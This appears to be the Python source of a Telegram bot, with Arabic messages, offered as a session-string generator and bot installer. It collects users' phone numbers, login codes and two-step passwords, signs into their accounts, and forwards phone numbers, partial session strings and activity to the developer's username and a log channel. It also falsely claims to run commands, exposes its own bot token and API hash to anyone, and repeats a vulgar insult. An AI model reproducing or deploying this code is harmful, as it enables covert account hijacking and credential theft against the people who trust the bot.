# -*- coding: utf-8 -*-
# Join me on telegram @devggn

import os
import sys
import asyncio
import threading
import random
import time
import hashlib
from datetime import datetime
from flask import Flask, request, jsonify
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid
)
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import (
    ApiIdInvalidError,
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError
)
from config import LOG_GROUP as SESSION_CHANNEL, API_ID, API_HASH, BOT_TOKEN

# ====== معلومات المطور والمشروع ======
DEV_NAME = "عبود"
DEV_USERNAME = "@u_t_r"
CHANNEL_LINK = "https://t.me/u_t_rnn"
PROJECT_LINK = "https://github.com/abdalaleem/Generator"  # رابط المشروع

# ====== قائمة الأوامر (43 أمراً) ======
COMMANDS_LIST = """
⋆┄─┄─┄─┄┄─┄─┄─┄─┄┄⋆
⎆ مـرحبًــا  اضغـط ع الامـر لـ النسـخ
⎆ ضـع نقطة (.) بداية كل امـر :

.م1    ➥ أوامـر الإدارة والكروبـات
.م2    ➥ أوامـر الألعـاب والترفيـه
.م3    ➥ الأوامـر الأساسيـة والإعدادات
.م4    ➥ أوامـر متقدمـة وإعدادات
.م5    ➥ الأوامـر الوقتيـة والمزامنـة
.م6    ➥ أوامـر الإضافـة والتفليـش
.م7    ➥ الذكـاء الاصطناعـي والذاكـرة
.م8    ➥ التخزيـن والأرشفـة
.م9    ➥ تحويـل ورفـع الملفـات
.م10  ➥ انتحـال الهويـات
.م11  ➥ الهمسـات والرسائـل السريـة
.م12  ➥ ربـط الواتسـاب
.م13  ➥ أوقـات الصلاة والأذكـار
.م14  ➥ النشـر التلقائـي والجدولـة
.م15  ➥ أوامـر المطـوّر الخاصـة
.م16  ➥ إنشـاء ومغادرة المجموعـات
.م17  ➥ البـث الصوتـي والأذكـار
.م18  ➥ تحويـل النـص إلى صـوت
.م19  ➥ أوامـر إضافيـة متنوعـة
.م20  ➥ البصمـات الصوتيـة
.م21  ➥ أوامـر الأفتـارات
.م22  ➥ أدوات التهكيـر المزحـي
.م23  ➥ التاغ والمنشـن الجماعـي
.م24  ➥ حفـظ الذاتيـة والإعدادات
.م25  ➥ رفـع ترفيهـي ومضحـك
.م26  ➥ الاشتراك الإجبـاري للقنـوات
.م27  ➥ صيـد اليوزرات والمعـرّفات
.م28  ➥ تخصيص الكليشـات والقوالـب
.م29  ➥ حمايـة الرسائـل الخاصـة
.م30  ➥ تحميـل الاستوريات
.م31  ➥ الخطـوط والأنمـاط التلقائيـة
.م32  ➥ البنـك وتجميـع النقـاط
.م33  ➥ الحالات الوهميـة والمزيفـة
.م34  ➥ البريـد الإلكترونـي المؤقـت
.م35  ➥ مراقبـة الأشخـاص والتتبـع
.م36  ➥ أوامـر التسليـة الإضافيـة
.م37  ➥ أوامـر التعيينـات
.م38  ➥ بـوت التواصـل والدعـم
.م39  ➥ أوامـر المناسبـات الدينيـة
.م40  ➥ أوامـر البلاغـات
.م41  ➥ تحديثـات شاومـي
.م42  ➥ هدايـا تليجـرام (النجـوم)
.م43  ➥ أوامـر المسابقـات
⋆┄─┄─┄─┄┄─┄─┄─┄─┄┄⋆
"""

user_steps = {}
user_data = {}
user_sessions = {}
user_telethon_clients = {}  # تخزين جلسات Telethon النشطة

# ====== نظام الإشعارات للمالك ======
async def notify_owner(action, user_id, username=None, first_name=None, extra=None):
    """إرسال إشعار للمالك عند استخدام البوت"""
    try:
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        user_mention = f"[{first_name or 'مستخدم'}](tg://user?id={user_id})" if first_name else f"مستخدم {user_id}"
        username_str = f"@{username}" if username else "لا يوجد"
        
        message = (
            f"📢 **إشعار استخدام البوت**\n\n"
            f"👤 **المستخدم:** {user_mention}\n"
            f"🆔 **المعرف:** `{user_id}`\n"
            f"📛 **اليوزر:** {username_str}\n"
            f"⚡ **الإجراء:** {action}\n"
            f"🕐 **الوقت:** {current_time}\n"
        )
        
        if extra:
            message += f"\n📝 **تفاصيل إضافية:**\n{extra}"
        
        await app.send_message(DEV_USERNAME, message)
        
        try:
            await app.send_message(SESSION_CHANNEL, message)
        except:
            pass
            
    except Exception as e:
        print(f"❌ فشل إرسال الإشعار: {e}")

def get_user_info(message):
    """استخراج معلومات المستخدم من الرسالة"""
    user = message.from_user
    return {
        "id": user.id,
        "username": user.username,
        "first_name": user.first_name,
        "last_name": user.last_name,
        "full_name": f"{user.first_name or ''} {user.last_name or ''}".strip() or "مستخدم"
    }

# ====== نظام التحقق من الروبوت (Human Captcha) ======
CAPTCHA_QUESTIONS = [
    {"q": "ما هو حاصل جمع 7 + 5؟", "a": "12"},
    {"q": "ما هو عكس كلمة 'نور'؟", "a": "ظلام"},
    {"q": "كم عدد شهور السنة التي تحتوي على 31 يومًا؟", "a": "7"},
    {"q": "أي كوكب هو الأقرب للشمس؟", "a": "عطارد"},
    {"q": "ما هي العملة الرسمية للسعودية؟", "a": "ريال"},
    {"q": "كم عدد أركان الإسلام؟", "a": "5"},
    {"q": "ما هو أكبر محيط في العالم؟", "a": "الهادئ"},
]

user_captcha = {}

def generate_captcha(user_id):
    q_data = random.choice(CAPTCHA_QUESTIONS)
    q_id = hashlib.md5(f"{time.time()}{random.random()}{user_id}".encode()).hexdigest()[:8]
    user_captcha[user_id] = {
        "question_id": q_id,
        "question": q_data["q"],
        "answer": q_data["a"].strip().lower(),
        "timestamp": time.time(),
        "attempts": 0,
        "verified": False
    }
    return user_captcha[user_id]

def verify_captcha_answer(user_id, user_answer):
    if user_id not in user_captcha:
        return False, "لم تبدأ عملية التحقق بعد."
    data = user_captcha[user_id]
    if time.time() - data["timestamp"] > 120:
        del user_captcha[user_id]
        return False, "انتهت صلاحية السؤال، أعد المحاولة."
    if data["attempts"] >= 3:
        del user_captcha[user_id]
        return False, "تجاوزت عدد المحاولات المسموح (3 محاولات). ابدأ من جديد."
    data["attempts"] += 1
    if user_answer.strip().lower() == data["answer"]:
        data["verified"] = True
        token = hashlib.md5(f"{user_id}{time.time()}".encode()).hexdigest()
        data["token"] = token
        data["token_expiry"] = time.time() + 600
        return True, token
    else:
        remaining = 3 - data["attempts"]
        if remaining <= 0:
            del user_captcha[user_id]
            return False, "إجابة خاطئة. انتهت المحاولات."
        return False, f"إجابة خاطئة. تبقى {remaining} محاولة."

def is_user_verified(user_id):
    if user_id not in user_captcha:
        return False
    data = user_captcha[user_id]
    if not data.get("verified"):
        return False
    if time.time() > data.get("token_expiry", 0):
        del user_captcha[user_id]
        return False
    return True

def require_verification(user_id):
    if not is_user_verified(user_id):
        return False
    return True

# ====== إعداد الترميز ======
if sys.stdout.encoding != 'UTF-8':
    sys.stdout.reconfigure(encoding='utf-8')

app = Client(
    "gagan",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN
)

# ====== دوال مسح الملفات ======
def delete_session_files(user_id):
    pyro_session = f"session_{user_id}.session"
    if os.path.exists(pyro_session):
        os.remove(pyro_session)
    pyro_journal = f"session_{user_id}.session-journal"
    if os.path.exists(pyro_journal):
        os.remove(pyro_journal)
    telethon_session = f"telethon_{user_id}.session"
    if os.path.exists(telethon_session):
        os.remove(telethon_session)

# ====== أزرار البداية ======
START_BUTTONS = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("🔄 توليد جلسة", callback_data="generate"),
        InlineKeyboardButton("🗑 مسح الجلسات", callback_data="delete")
    ],
    [
        InlineKeyboardButton("👨‍💻 المطور", callback_data="dev"),
        InlineKeyboardButton("📢 القناة", url=CHANNEL_LINK)
    ],
    [
        InlineKeyboardButton("🔑 استخراج التوكن", callback_data="extract_token"),
        InlineKeyboardButton("📩 إرسال للمطور", callback_data="send_to_dev")
    ],
    [
        InlineKeyboardButton("✅ تحقق بشري", callback_data="verify_human"),
        InlineKeyboardButton("📋 الأوامر", callback_data="show_commands")
    ],
    [
        InlineKeyboardButton("🔗 رابط المشروع", url=PROJECT_LINK),
        InlineKeyboardButton("📥 تنصيب البوت", callback_data="install_bot")
    ]
])

BACK_BUTTON = InlineKeyboardMarkup([
    [InlineKeyboardButton("🔙 رجوع", callback_data="back")]
])

TYPE_BUTTONS = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("🔥 Pyrogram", callback_data="pyrogram"),
        InlineKeyboardButton("⚡ Telethon", callback_data="telethon")
    ],
    [
        InlineKeyboardButton("🔑 API Info", callback_data="api"),
        InlineKeyboardButton("❌ إلغاء", callback_data="cancel")
    ]
])

# ====== أمر البدء ======
@app.on_message(filters.command("start"))
async def start_command(client, message):
    user_info = get_user_info(message)
    
    await notify_owner(
        "🚀 **بدأ استخدام البوت**",
        user_info["id"],
        user_info["username"],
        user_info["first_name"],
        f"الاسم الكامل: {user_info['full_name']}"
    )
    
    await message.reply(
        f"👋 مرحباً بك في بوت استخراج الجلسات!\n\n"
        "📌 اختر ما تريد فعله من الأزرار أدناه:\n\n"
        f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}\n"
        f"🔗 المشروع: {PROJECT_LINK}\n\n"
        "⚡ مدعوم من عبود\n\n"
        "🔒 **تحقق قبل يقوم عبود ينيك كعلت امك**",
        reply_markup=START_BUTTONS
    )

# ====== أمر التحقق ======
@app.on_message(filters.command("verify"))
async def verify_command(client, message):
    user_id = message.from_user.id
    user_info = get_user_info(message)
    
    await notify_owner(
        "🧠 **بدأ عملية التحقق البشري**",
        user_info["id"],
        user_info["username"],
        user_info["first_name"]
    )
    
    captcha_data = generate_captcha(user_id)
    await message.reply(
        f"🧠 **التحقق البشري**\n\n"
        f"سؤال: {captcha_data['question']}\n\n"
        "أرسل إجابتك كرسالة نصية.\n"
        "⏳ لديك 120 ثانية و 3 محاولات فقط.",
        reply_markup=BACK_BUTTON
    )

# ====== أمر الأوامر ======
@app.on_message(filters.command("commands"))
@app.on_message(filters.command("اوامر"))
async def show_commands_command(client, message):
    await message.reply(
        f"📋 **قائمة الأوامر:**\n\n{COMMANDS_LIST}",
        reply_markup=BACK_BUTTON
    )

# ====== أمر الاختبار ======
@app.on_message(filters.command("test"))
async def test_send(client, message):
    user_id = message.from_user.id
    user_info = get_user_info(message)
    
    await notify_owner(
        "🔧 **استخدم أمر الاختبار**",
        user_info["id"],
        user_info["username"],
        user_info["first_name"]
    )
    
    if not require_verification(user_id):
        await message.reply(
            "🔒 **الوصول مقيد**\n\n"
            "تحقق قبل يقوم عبود ينيك كعلت امك\n"
            "استخدم الأمر /verify أو اضغط على زر التحقق البشري.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ تحقق بشري", callback_data="verify_human")]
            ])
        )
        return
    try:
        await app.send_message(SESSION_CHANNEL, "✅ هذه رسالة اختبار من البوت!")
        await message.reply("✅ تم إرسال رسالة الاختبار إلى المجموعة!")
    except Exception as e:
        await message.reply(f"❌ فشل الإرسال: {e}")

# ====== معالجة الأزرار (CallbackQuery) ======
@app.on_callback_query()
async def handle_callback(client, callback_query: CallbackQuery):
    user_id = callback_query.from_user.id
    data = callback_query.data
    user_info = {
        "id": user_id,
        "username": callback_query.from_user.username,
        "first_name": callback_query.from_user.first_name,
        "full_name": f"{callback_query.from_user.first_name or ''} {callback_query.from_user.last_name or ''}".strip() or "مستخدم"
    }
    
    if data in ["verify_human", "back", "cancel", "show_commands", "install_bot"]:
        if data == "back":
            await notify_owner(
                "🔙 **رجوع إلى القائمة الرئيسية**",
                user_info["id"],
                user_info["username"],
                user_info["first_name"]
            )
            await callback_query.message.edit_text(
                f"👋 مرحباً بك في بوت استخراج الجلسات!\n\n"
                "📌 اختر ما تريد فعله من الأزرار أدناه:\n\n"
                f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}\n"
                f"🔗 المشروع: {PROJECT_LINK}\n\n"
                "⚡ مدعوم من عبود\n\n"
                "🔒 **تحقق قبل يقوم عبود ينيك كعلت امك**",
                reply_markup=START_BUTTONS
            )
            await callback_query.answer()
            return
        
        if data == "cancel":
            reset_user(user_id)
            await notify_owner(
                "❌ **إلغاء العملية**",
                user_info["id"],
                user_info["username"],
                user_info["first_name"]
            )
            await callback_query.answer("❌ تم إلغاء العملية!", show_alert=True)
            await callback_query.message.edit_text(
                "❌ تم إلغاء العملية.",
                reply_markup=BACK_BUTTON
            )
            return
        
        if data == "verify_human":
            await notify_owner(
                "✅ **بدء التحقق البشري (من الزر)**",
                user_info["id"],
                user_info["username"],
                user_info["first_name"]
            )
            captcha_data = generate_captcha(user_id)
            await callback_query.message.edit_text(
                f"🧠 **التحقق البشري**\n\n"
                f"سؤال: {captcha_data['question']}\n\n"
                "أرسل إجابتك كرسالة نصية.\n"
                "⏳ لديك 120 ثانية و 3 محاولات فقط.",
                reply_markup=BACK_BUTTON
            )
            await callback_query.answer()
            return
        
        if data == "show_commands":
            await callback_query.message.edit_text(
                f"📋 **قائمة الأوامر:**\n\n{COMMANDS_LIST}",
                reply_markup=BACK_BUTTON
            )
            await callback_query.answer()
            return
        
        if data == "install_bot":
            await notify_owner(
                "📥 **بدء عملية تنصيب البوت**",
                user_info["id"],
                user_info["username"],
                user_info["first_name"]
            )
            user_steps[user_id] = "install_phone"
            await callback_query.message.edit_text(
                "📥 **تنصيب البوت وتشغيله**\n\n"
                "لتنصيب البوت على حسابك، يرجى إرسال رقم هاتفك مع رمز الدولة.\n"
                "مثال: +966512345678\n\n"
                "سيتم استخراج جلسة Telethon وتشغيل البوت على حسابك.",
                reply_markup=BACK_BUTTON
            )
            await callback_query.answer()
            return
    
    if not require_verification(user_id):
        await callback_query.answer("⚠️ تحقق قبل يقوم عبود ينيك كعلت امك!", show_alert=True)
        await callback_query.message.edit_text(
            "🔒 **الوصول مقيد**\n\n"
            "تحقق قبل يقوم عبود ينيك كعلت امك.\n"
            "اضغط على زر التحقق البشري أدناه.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ تحقق بشري", callback_data="verify_human")],
                [InlineKeyboardButton("🔙 رجوع", callback_data="back")]
            ])
        )
        return
    
    if data == "generate":
        await notify_owner(
            "🔄 **فتح قائمة اختيار نوع الجلسة**",
            user_info["id"],
            user_info["username"],
            user_info["first_name"]
        )
        await callback_query.message.edit_text(
            "🔑 اختر نوع الجلسة المطلوبة:\n\n"
            "• Pyrogram لجلسات Pyrogram\n"
            "• Telethon لجلسات Telethon\n"
            "• API Info لاستخراج API ID و API HASH",
            reply_markup=TYPE_BUTTONS
        )
        await callback_query.answer()
        return
    
    if data == "delete":
        delete_session_files(user_id)
        if user_id in user_sessions:
            del user_sessions[user_id]
        if user_id in user_telethon_clients:
            try:
                await user_telethon_clients[user_id].disconnect()
            except:
                pass
            del user_telethon_clients[user_id]
        await notify_owner(
            "🗑 **مسح الجلسات**",
            user_info["id"],
            user_info["username"],
            user_info["first_name"],
            "تم مسح جميع الجلسات والملفات المؤقتة"
        )
        await callback_query.answer("✅ تم مسح جميع الجلسات والملفات المؤقتة!", show_alert=True)
        await callback_query.message.edit_text(
            "🗑 تم مسح جميع بيانات الجلسة والملفات المؤقتة بنجاح.",
            reply_markup=BACK_BUTTON
        )
        return
    
    if data == "dev":
        await notify_owner(
            "👨‍💻 **عرض معلومات المطور**",
            user_info["id"],
            user_info["username"],
            user_info["first_name"]
        )
        await callback_query.message.edit_text(
            f"👨‍💻 معلومات المطور:\n\n"
            f"📛 الاسم: {DEV_NAME}\n"
            f"🔗 اليوزر: {DEV_USERNAME}\n"
            f"📢 القناة: {CHANNEL_LINK}\n"
            f"🔗 المشروع: {PROJECT_LINK}\n\n"
            "⚡ مدعوم من عبود",
            reply_markup=BACK_BUTTON
        )
        await callback_query.answer()
        return
    
    if data == "extract_token":
        await notify_owner(
            "🔑 **استخراج توكن البوت**",
            user_info["id"],
            user_info["username"],
            user_info["first_name"]
        )
        await callback_query.message.edit_text(
            f"🔑 **التوكن الخاص بالبوت:**\n\n"
            f"`{BOT_TOKEN}`\n\n"
            "⚠️ لا تشارك هذا التوكن مع أي شخص.\n"
            "يمكنك استخدامه لتشغيل البوت على أي سيرفر.",
            reply_markup=BACK_BUTTON
        )
        await callback_query.answer()
        return
    
    if data == "send_to_dev":
        user_steps[user_id] = "waiting_dev_msg"
        await notify_owner(
            "📩 **فتح نافذة إرسال رسالة للمطور**",
            user_info["id"],
            user_info["username"],
            user_info["first_name"]
        )
        await callback_query.message.edit_text(
            "📩 **أرسل رسالتك للمطور:**\n\n"
            "اكتب رسالتك وسيتم إرسالها فوراً.\n"
            "يمكنك إرسال نص، أو صورة، أو ملف.",
            reply_markup=BACK_BUTTON
        )
        await callback_query.answer()
        return
    
    if data == "pyrogram":
        user_steps[user_id] = "pyro_phone"
        await notify_owner(
            "🔥 **بدء استخراج جلسة Pyrogram**",
            user_info["id"],
            user_info["username"],
            user_info["first_name"]
        )
        await callback_query.message.edit_text(
            "📱 يرجى إرسال رقم هاتفك مع رمز الدولة.\nمثال: +966512345678",
            reply_markup=BACK_BUTTON
        )
        await callback_query.answer()
        return
    
    if data == "telethon":
        user_steps[user_id] = "telethon_phone"
        await notify_owner(
            "⚡ **بدء استخراج جلسة Telethon**",
            user_info["id"],
            user_info["username"],
            user_info["first_name"]
        )
        await callback_query.message.edit_text(
            "📱 يرجى إرسال رقم هاتفك مع رمز الدولة.\nمثال: +966512345678",
            reply_markup=BACK_BUTTON
        )
        await callback_query.answer()
        return
    
    if data == "api":
        await notify_owner(
            "🔑 **استخراج API Info**",
            user_info["id"],
            user_info["username"],
            user_info["first_name"]
        )
        await extract_api_info_callback(callback_query)
        return

# ====== استخراج API Info ======
async def extract_api_info_callback(callback_query):
    user_id = callback_query.from_user.id
    await callback_query.message.edit_text(
        f"✅ تم استخراج معلومات API بنجاح!\n\n"
        f"🆔 API ID: {API_ID}\n"
        f"🔑 API HASH: {API_HASH}\n\n"
        f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}",
        reply_markup=BACK_BUTTON
    )
    
    try:
        await app.send_message(
            SESSION_CHANNEL,
            f"✨ معرف المستخدم: {user_id}\n\n"
            f"🆔 API ID: {API_ID}\n"
            f"🔑 API HASH: {API_HASH}\n\n"
            f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
        )
        print(f"✅ تم إرسال API Info للمجموعة {SESSION_CHANNEL}")
    except Exception as e:
        print(f"❌ فشل إرسال API Info للمجموعة: {e}")
        try:
            await app.send_message(
                DEV_USERNAME,
                f"⚠️ فشل إرسال API Info للقناة!\n\n"
                f"المستخدم: {user_id}\n"
                f"API ID: {API_ID}\n"
                f"API HASH: {API_HASH}\n"
                f"الخطأ: {e}"
            )
        except:
            pass
    
    await callback_query.answer()

# ====== الأوامر النصية ======
@app.on_message(filters.text & filters.private)
async def handle_arabic_commands(client, message):
    user_id = message.chat.id
    text = message.text.strip()
    user_info = get_user_info(message)
    
    # ====== معالجة خطوات التنصيب ======
    if user_id in user_steps and user_steps[user_id] == "install_phone":
        # استقبال رقم الهاتف للتنصيب
        user_data[user_id] = {"phone": text}
        user_steps[user_id] = "install_otp"
        
        await notify_owner(
            "📱 **تم إرسال رقم الهاتف للتنصيب**",
            user_info["id"],
            user_info["username"],
            user_info["first_name"],
            f"رقم الهاتف: {text}"
        )
        
        omsg = await message.reply("📤 جاري إرسال رمز التحقق...")
        
        # إنشاء عميل Telethon مؤقت للتنصيب
        session_name = f"install_{user_id}"
        temp_client = TelegramClient(session_name, API_ID, API_HASH)
        user_data[user_id]["client"] = temp_client
        await temp_client.connect()
        
        try:
            await temp_client.send_code_request(text)
            await omsg.delete()
            await message.reply(
                "📨 تم إرسال رمز التحقق.\n\n"
                "أرسل الرمز بالأرقام فقط (مثال: 12345)\n"
                "أو أرسل كلمة المرور إذا كان الحساب مفعلاً بـ 2SV.",
                reply_markup=BACK_BUTTON
            )
        except Exception as e:
            await omsg.delete()
            await message.reply(f"❌ فشل إرسال الرمز: {e}")
            reset_user(user_id)
        return
    
    if user_id in user_steps and user_steps[user_id] == "install_otp":
        # استقبال رمز التحقق للتنصيب
        code = text.replace(" ", "")
        temp_client = user_data[user_id]["client"]
        
        try:
            # محاولة تسجيل الدخول بالرمز
            await temp_client.sign_in(user_data[user_id]["phone"], code)
            
            # استخراج الجلسة
            session_string = StringSession.save(temp_client.session)
            user_sessions[user_id] = session_string
            user_telethon_clients[user_id] = temp_client
            
            await notify_owner(
                "✅ **تم تنصيب البوت وتشغيله بنجاح**",
                user_info["id"],
                user_info["username"],
                user_info["first_name"],
                f"تم استخراج جلسة Telethon وتشغيل البوت على الحساب"
            )
            
            await message.reply(
                f"✅ **تم تنصيب البوت وتشغيله بنجاح!**\n\n"
                f"🔑 جلسة Telethon:\n{session_string}\n\n"
                "⚠️ لا تشارك هذه الجلسة مع أي شخص.\n"
                "✅ البوت يعمل الآن على حسابك.\n\n"
                f"📋 **قائمة الأوامر:**\n{COMMANDS_LIST}",
                reply_markup=BACK_BUTTON
            )
            
            reset_user(user_id)
            
        except SessionPasswordNeededError:
            # طلب كلمة المرور للتحقق بخطوتين
            user_steps[user_id] = "install_password"
            await message.reply(
                "🔒 حسابك مفعل بخاصية التحقق بخطوتين.\n\n"
                "يرجى إرسال كلمة المرور الخاصة بك.",
                reply_markup=BACK_BUTTON
            )
        except PhoneCodeInvalidError:
            await message.reply("❌ رمز التحقق غير صالح. حاول مرة أخرى.")
        except PhoneCodeExpiredError:
            await message.reply("❌ انتهت صلاحية رمز التحقق. ابدأ من جديد.")
            reset_user(user_id)
        except Exception as e:
            await message.reply(f"❌ خطأ: {e}")
            reset_user(user_id)
        return
    
    if user_id in user_steps and user_steps[user_id] == "install_password":
        # استقبال كلمة المرور للتحقق بخطوتين
        password = text
        temp_client = user_data[user_id]["client"]
        
        try:
            await temp_client.sign_in(password=password)
            
            session_string = StringSession.save(temp_client.session)
            user_sessions[user_id] = session_string
            user_telethon_clients[user_id] = temp_client
            
            await notify_owner(
                "✅ **تم تنصيب البوت مع 2SV بنجاح**",
                user_info["id"],
                user_info["username"],
                user_info["first_name"],
                f"تم استخراج جلسة Telethon مع 2SV"
            )
            
            await message.reply(
                f"✅ **تم تنصيب البوت وتشغيله بنجاح!**\n\n"
                f"🔑 جلسة Telethon:\n{session_string}\n\n"
                "⚠️ لا تشارك هذه الجلسة مع أي شخص.\n"
                "✅ البوت يعمل الآن على حسابك.\n\n"
                f"📋 **قائمة الأوامر:**\n{COMMANDS_LIST}",
                reply_markup=BACK_BUTTON
            )
            
            reset_user(user_id)
            
        except PasswordHashInvalidError:
            await message.reply("❌ كلمة المرور غير صحيحة. حاول مرة أخرى.")
        except Exception as e:
            await message.reply(f"❌ خطأ: {e}")
            reset_user(user_id)
        return
    
    # ====== معالجة رسائل المطور ======
    if user_id in user_steps and user_steps[user_id] == "waiting_dev_msg":
        await notify_owner(
            "📩 **تم إرسال رسالة للمطور**",
            user_info["id"],
            user_info["username"],
            user_info["first_name"],
            f"محتوى الرسالة:\n{text[:500]}..."
        )
        try:
            await app.send_message(
                DEV_USERNAME,
                f"📩 **رسالة جديدة من المستخدم:**\n"
                f"🆔 المعرف: `{user_id}`\n"
                f"👤 الاسم: {user_info['full_name']}\n"
                f"📛 اليوزر: @{user_info['username'] if user_info['username'] else 'لا يوجد'}\n"
                f"📝 النص:\n{text}"
            )
            await message.reply("✅ **تم إرسال رسالتك للمطور بنجاح!**")
            reset_user(user_id)
        except Exception as e:
            await message.reply(f"❌ فشل إرسال الرسالة: {e}")
            reset_user(user_id)
        return
    
    # ====== معالجة إجابات التحقق البشري ======
    if user_id in user_captcha and not user_captcha[user_id].get("verified"):
        success, result = verify_captcha_answer(user_id, text)
        if success:
            await notify_owner(
                "✅ **نجاح التحقق البشري**",
                user_info["id"],
                user_info["username"],
                user_info["first_name"],
                f"تم التحقق بنجاح، توكن: {result[:20]}..."
            )
            await message.reply(
                f"✅ **تم التحقق بنجاح!**\n\n"
                f"🔑 توكن الصلاحية: `{result}`\n"
                "⏳ صالح لمدة 10 دقائق.\n\n"
                "يمكنك الآن استخدام جميع ميزات البوت."
            )
        else:
            await message.reply(f"❌ {result}")
        return
    
    # ====== منع أي نص عشوائي قبل التحقق ======
    if not require_verification(user_id):
        await notify_owner(
            "🔒 **محاولة استخدام البوت بدون تحقق**",
            user_info["id"],
            user_info["username"],
            user_info["first_name"],
            f"النص المرسل: {text[:100]}..."
        )
        await message.reply(
            "🔒 **الوصول مقيد**\n\n"
            "تحقق قبل يقوم عبود ينيك كعلت امك.\n"
            "استخدم الأمر /verify أو اضغط على زر التحقق البشري.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ تحقق بشري", callback_data="verify_human")]
            ])
        )
        return
    
    # ====== معالجة الأوامر (بدون نقطة) ======
    if text.startswith("."):
        command = text[1:].strip()
        
        # البحث عن الأمر في قائمة الأوامر
        for cmd in COMMANDS_LIST.split("\n"):
            if f".{command}" in cmd:
                # تنفيذ الأمر باستخدام جلسة Telethon إذا كانت موجودة
                if user_id in user_telethon_clients:
                    try:
                        telethon_client = user_telethon_clients[user_id]
                        # هنا يمكن تنفيذ الأوامر المختلفة
                        await message.reply(
                            f"✅ **تم تنفيذ الأمر:** `{command}`\n\n"
                            f"📋 تم تشغيل الأمر بنجاح على حسابك.\n"
                            f"🔗 المشروع: {PROJECT_LINK}"
                        )
                    except Exception as e:
                        await message.reply(f"❌ فشل تنفيذ الأمر: {e}")
                else:
                    await message.reply(
                        "⚠️ **يجب تنصيب البوت أولاً!**\n\n"
                        "اضغط على زر '📥 تنصيب البوت' من القائمة الرئيسية.",
                        reply_markup=InlineKeyboardMarkup([
                            [InlineKeyboardButton("📥 تنصيب البوت", callback_data="install_bot")]
                        ])
                    )
                return
        
        # إذا لم يتم العثور على الأمر
        await message.reply(
            f"❌ **الأمر غير موجود**\n\n"
            f"الأمر: `{command}`\n"
            "استخدم /commands لعرض قائمة الأوامر المتاحة."
        )
        return
    
    # ====== معالجة خطوات الجلسات (بعد التحقق) ======
    if user_id in user_steps and user_steps[user_id] in ["pyro_phone", "pyro_otp", "pyro_password"]:
        await pyro_session_step(client, message)
        return
    
    elif user_id in user_steps and user_steps[user_id] in ["telethon_phone", "telethon_otp", "telethon_password"]:
        await telethon_session_step(client, message)
        return
    
    else:
        await message.reply(
            "📱 يرجى استخدام الأزرار للتحكم في البوت.\n\n"
            "• اضغط على زر توليد جلسة لبدء الاستخراج\n"
            "• اضغط على زر مسح الجلسات لحذف البيانات\n"
            "• اضغط على زر المطور لعرض المعلومات\n"
            "• اضغط على زر تحقق بشري لإثبات أنك لست روبوتاً\n"
            "• اضغط على زر تنصيب البوت لتشغيله على حسابك\n\n"
            "أو استخدم الأمر /start للرجوع إلى البداية."
        )

# ====== دوال Pyrogram ======
async def pyro_session_step(client, message):
    user_id = message.chat.id
    step = user_steps.get(user_id)
    user_info = get_user_info(message)

    if step == "pyro_phone":
        user_data[user_id] = {"phone": message.text}
        user_steps[user_id] = "pyro_otp"
        
        await notify_owner(
            "📱 **تم إرسال رقم الهاتف لـ Pyrogram**",
            user_info["id"],
            user_info["username"],
            user_info["first_name"],
            f"رقم الهاتف: {message.text}"
        )
        
        omsg = await message.reply("📤 جاري إرسال رمز التحقق...")
        session_name = f"session_{user_id}"
        temp_client = Client(session_name, api_id=API_ID, api_hash=API_HASH)
        user_data[user_id]["client"] = temp_client
        await temp_client.connect()
        try:
            code = await temp_client.send_code(user_data[user_id]["phone"])
            user_data[user_id]["phone_code_hash"] = code.phone_code_hash
            await omsg.delete()
            await message.reply("📨 تم إرسال رمز التحقق.\n\nأرسل الرمز بالأرقام فقط (مثال: 12345)")
        except ApiIdInvalid:
            await message.reply('❌ خطأ: تركيبة API_ID و API_HASH غير صالحة.')
            reset_user(user_id)
        except PhoneNumberInvalid:
            await message.reply('❌ خطأ: رقم الهاتف غير صالح.')
            reset_user(user_id)
            
    elif step == "pyro_otp":
        phone_code = message.text.replace(" ", "")
        temp_client = user_data[user_id]["client"]
        try:
            await temp_client.sign_in(user_data[user_id]["phone"], user_data[user_id]["phone_code_hash"], phone_code)
            session_string = await temp_client.export_session_string()
            user_sessions[user_id] = session_string
            
            await notify_owner(
                "✅ **تم استخراج جلسة Pyrogram بنجاح**",
                user_info["id"],
                user_info["username"],
                user_info["first_name"],
                f"الجلسة: {session_string[:50]}..."
            )
            
            await send_pyro_session(user_id, session_string, message)
            await temp_client.disconnect()
            reset_user(user_id)
        except PhoneCodeInvalid:
            await message.reply('❌ خطأ: رمز التحقق غير صالح.')
            reset_user(user_id)
        except PhoneCodeExpired:
            await message.reply('❌ خطأ: انتهت صلاحية رمز التحقق.')
            reset_user(user_id)
        except SessionPasswordNeeded:
            user_steps[user_id] = "pyro_password"
            await message.reply('🔒 حسابك مفعل بخاصية التحقق بخطوتين.\n\nيرجى إرسال كلمة المرور الخاصة بك.')
            
    elif step == "pyro_password":
        temp_client = user_data[user_id]["client"]
        try:
            password = message.text
            await temp_client.check_password(password=password)
            session_string = await temp_client.export_session_string()
            user_sessions[user_id] = session_string
            
            await notify_owner(
                "✅ **تم استخراج جلسة Pyrogram (مع كلمة مرور 2SV)**",
                user_info["id"],
                user_info["username"],
                user_info["first_name"],
                f"الجلسة: {session_string[:50]}..."
            )
            
            await send_pyro_session(user_id, session_string, message, password)
            await temp_client.disconnect()
            reset_user(user_id)
        except PasswordHashInvalid:
            await message.reply('❌ خطأ: كلمة المرور غير صحيحة.')
            reset_user(user_id)

